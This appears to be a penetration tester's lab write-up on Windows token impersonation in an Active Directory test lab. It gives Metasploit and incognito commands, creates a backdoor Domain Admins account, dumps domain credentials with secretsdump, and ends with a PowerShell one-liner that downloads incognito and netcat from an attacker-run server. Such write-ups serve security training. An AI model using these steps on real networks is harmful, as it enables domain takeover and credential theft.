# Token Impersonation Attack

## Tokens

For ease of understanding, you can think of tokens as cookies for the computer. These temporary keys allow you access to a system, a network, or a resource without providing the credentials. A web pentester can think of them as cookies or tokens (JWT etc) for accessing credential-protected resources.
A great thing about tokens is that they persist until the next reboot. When a user logs off, their delegate token is reported as an impersonate token. But that token will still hold all the rights of a delegate token.
### Types of Tokens

There are two types of tokens

- Delegate Token
    - These tokens are for the `interactive` logons, such as logging into the machine or connecting to it via Remote Desktop
- Impersonate Token
    - These tokens are for the `non-interactive` sessions, such as attaching a network drive or a domain logon script
[source](https://www.hackingloops.com/token-impersonation-attack/)

**Token impersonation** is a Windows post-exploitation technique that allows an attacker to steal the access token of a logged-on user on the system without knowing their credentials and impersonate them to perform operations with their privileges. [soruce](https://medium.com/r3d-buck3t/domain-escalation-with-token-impersonation-bc577db55a0f)

# Attack DEMO

**Tools required to perform this attack:**
-  Metasploit
- Incognito Standalone Application

**Scenario:** I already have an Active Directory Attack Lab setup that comprises of 1 Domain Controller and 2 Windows 10 machines. For this attack i only need to start up the Domain Controller and 1 target machine. Since this is a post exploitation attack, i have already obtained valid login credentials to the machine through an LLMNR Poisoning attack. Read more [here]()
## Step 1: Start metasploit

![[attachments/Pasted image 20240308151216.png]]

We have to first of all gain access to the target machine using the psexec module in metasploit. We already have valid credentials for our target which was obtained after performing an LLMNR Poisoning attack.

## Step 2: Search for psexec

![[attachments/Pasted image 20240308151417.png]]

## Step 3: Set required options

Now to set required options: **RHOSTS**, **SMBDomain**, **SMBPass**, **SMBUser**, **Payload**

![[attachments/Pasted image 20240308151639.png]]
## Step 4: run the exploit

Options set, now to run the exploit:

![[attachments/Pasted image 20240308151723.png]]
meterpreter shell access obtained as `NT AUTHORITY\SYSTEM`

## Step 5: Load incognito module

Now for the **Token Impersonation Attack**, We first of all load the incoginito module:

![[attachments/Pasted image 20240308151908.png]]

`load incognito`

## Step 6: List available tokens

Now the module is loaded, we need to list the available tokens:

![[attachments/Pasted image 20240308151943.png]]

`list_tokens -u`

## Step 7: Impersonate a user

We can impersonate the fcastle user. Note: In a real world scenario, we would have to wait for users to logon to their accounts.

Impersonating the user fcastle:

![[attachments/Pasted image 20240308152339.png]]

`impersonate_token DEUSX\\fcastle` we add an additional `\` for character escape.

## Step 8: Impersonate Domain Admin User

We are now the fcastle user. Next up is to simulate a login on the machine as an admin and then check the token list again.

Domain Administrator login:

![[attachments/Pasted image 20240308152444.png]]

First run `rev2self` to go back to `NT AUTHORITY\SYSTEM` then list the tokens:

![[attachments/Pasted image 20240308152816.png]]

Now to impersonate the Admin:

![[attachments/Pasted image 20240308152921.png]]

Now that we are Domain Admin we can add user to the Domain:

![[attachments/Pasted image 20240308153211.png]]

`net user /add username password /domain`

Adding the user to the Domain Admins group

`net group "Domain Admins" username /ADD /DOMAIN`

The user has been added successfully and the user was also added to the Domain Admins group.

To confirm we can login and check the list of users:

![[attachments/Pasted image 20240308153336.png]]

![[attachments/Pasted image 20240308153410.png]]

With this new user we can now dump credentials from the domain using secretsdump.

![[attachments/Pasted image 20240308153622.png]]

`impacket-secretsdump DOMAIN/username:'password'@IP`

## Manual Exploitation

**Tools required:**
- Incognito binary https://github.com/FSecureLABS/incognito/blob/394545ffb844afcc18e798737cbd070ff3a4eb29/incognito.exe
- netcat 64 bit binary https://github.com/int0x33/nc.exe/blob/master/nc64.exe
- psexec https://github.com/fortra/impacket/blob/master/examples/psexec.py

### Step 1: Gain Shell Access using psexec

![[attachments/Pasted image 20240311162050.png]]

`psexec.py DOMAIN/username:'password'@Target_IP`

NOTE: I am using kali and i already have all impacket tools installed which is why i am running psexec using `impacket-psexec`

### Step 2: Transfer binaries (incognito & netcat) to Target system

First start a python server:

![[attachments/Pasted image 20240311162353.png]]

Then download on the Target machine:

![[attachments/Pasted image 20240311162555.png]]

```powershell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://IP:PORT/file', 'C:\file')"
```
